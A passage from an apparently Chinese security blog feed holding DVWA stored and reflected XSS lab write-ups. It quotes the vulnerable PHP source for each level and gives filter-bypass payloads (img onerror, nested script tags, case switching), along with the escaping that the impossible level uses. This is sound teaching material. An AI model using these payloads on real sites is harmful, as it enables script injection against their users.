语句中使用的字符串中的特殊字符。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转义的字符串。</td></tr><tr><td>connection</td><td>可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td></tr></tbody></table><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p><strong>以上这些函数都只是对数据库进行了防护，却没有考虑到对 XSS 进行过滤，所以依然可以正常的来 XSS</strong></p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><h3 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a><strong>查看源码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>payload1</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Name: <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span><br><span class="line"><span class="xml">Message: www.sqlsec.com</span></span><br></pre></td></tr></table></figure><p>可以看到我们的 payload直接插入到了数据库中了：</p><p><img src="https://image.3001.net/images/20200109/15785794078171.png" alt="img"></p><p>因为<code>name</code>过滤规则的缺陷，同样使用<strong>嵌套构造</strong>和<strong>大小写转换</strong>也是可以 Bypass 的：</p><p><strong>payload2</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Name: &lt;Script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br><span class="line"></span><br><span class="line"><span class="attr">Name</span>: &lt;s&lt;script&gt;cript&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure><p>测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这些记录。</p><h3 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">addslashes(<span class="keyword">string</span>)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>返回在<strong>预定义字符</strong>之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><h4 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strip_tags(<span class="keyword">string</span>,allow)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>剥去字符串中的 HTML、XML 以及 PHP 的标签。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要检查的字符串。</td></tr><tr><td><em>allow</em></td><td>可选。规定允许的标签。这些标签不会被删除。</td></tr></tbody></table><h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">htmlspecialchars(<span class="keyword">string</span>,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 <code>&amp;</code></li><li>“（双引号）成为 <code>&quot;</code></li><li>‘ （单引号）成为 <code>&#39;</code></li><li>&lt; （小于）成为 <code>&lt;</code></li><li>&gt; （大于）成为 <code>&gt;</code></li></ul><p><code>message</code> 变量几乎把所有的 XSS 都给过滤了，但是<code>name</code>变量只是过滤了<code>&lt;script&gt;</code> 标签而已，我们依然可以在<code>name</code>参数尝试使用其他的标签配合事件来触发弹窗。</p><p><code>name</code>的 input 输入文本框限制了长度：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>审查元素手动将<code>maxlength</code>的值调大一点就可以了。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;50&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><h3 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>message</code>变量依然是没有什么希望，重点分析下<code>name</code>变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来 Bypass：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Name: <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span><br><span class="line"><span class="xml">Message: www.sqlsec.com</span></span><br></pre></td></tr></table></figure><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><h3 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>message</code>和<code>name</code>变量都进行了严格的过滤，而且还检测了用户的 token：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure><p>有效地防止了 CSRF 的攻击</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>文章作者: 国光<br>文章链接: <a href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-29">https://www.sqlsec.com/2020/01/xss.html#toc-heading-29</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS (Reflected) 反射型跨站脚本</title>
      <link href="/2022/01/22/CTF/Web/dvwa/%E5%8F%8D%E5%B0%84%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC(XSS%20(Reflected))/"/>
      <url>/2022/01/22/CTF/Web/dvwa/%E5%8F%8D%E5%B0%84%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC(XSS%20(Reflected))/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-Reflected-反射型跨站脚本"><a href="#XSS-Reflected-反射型跨站脚本" class="headerlink" title="XSS (Reflected) 反射型跨站脚本"></a>XSS (Reflected) 反射型跨站脚本</h1><h1 id="反射型-XSS（非持久型）介绍"><a href="#反射型-XSS（非持久型）介绍" class="headerlink" title="反射型 XSS（非持久型）介绍"></a>反射型 XSS（非持久型）介绍</h1><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型 XSS 只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p><p>假设一个页面把用户输入的参数直接输出到页面上：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$input</span>.<span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户向<code>param</code>提交的数据会展示到<code>&lt;h1&gt;</code>的标签中展示出来，比如提交：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/test.php?param=Hello XSS</span><br></pre></td></tr></table></figure><p>会得到如下结果：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220122122116983.png" alt="image-20220122122116983"></p><p>此时查看页面源代码，可以看到：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时如果提交一个 JavaScript 代码:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>会发现，<code>alert(233)</code>在当前页面执行了：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220122122233385.png" alt="image-20220122122233385"></p><p>再查看源代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(233)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户输入的 Script 脚本，已经被写入页面中，这个就是一个最经典的反射型  XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型 XSS。反射型XSS的危害往往不如持久型  XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型 XSS 的攻击成本要比持久型 XSS 高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p><h1 id="DVWA-反射型XSS"><a href="#DVWA-反射型XSS" class="headerlink" title="DVWA-反射型XSS"></a>DVWA-反射型XSS</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看看到对<code>name</code>变量没有任何的过滤措施，只是单纯的检测了<code>name</code>变量存在并且不为空就直接输出到了网页中。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><h3 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只是简单的过滤了<code>&lt;script&gt;</code>标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。</p><p>使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了：</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>payload1</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>因为过滤规则的缺陷，这里可以使用嵌套构造来绕过：</p><p><strong>payload2</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的：</p><p><strong>payload3</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><h3 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果：</p><p><strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><h3 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>name</code>变量通过<code>htmlspecialchars()</code>函数被 HTML 实体化后输出在了<code>&lt;pre&gt;</code>标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><strong>文章链接:</strong> </p><p><a href="https://www.sqlsec.com/2020/01/xss.html">https://www.sqlsec.com/2020/01/xss.html</a></p><p><a 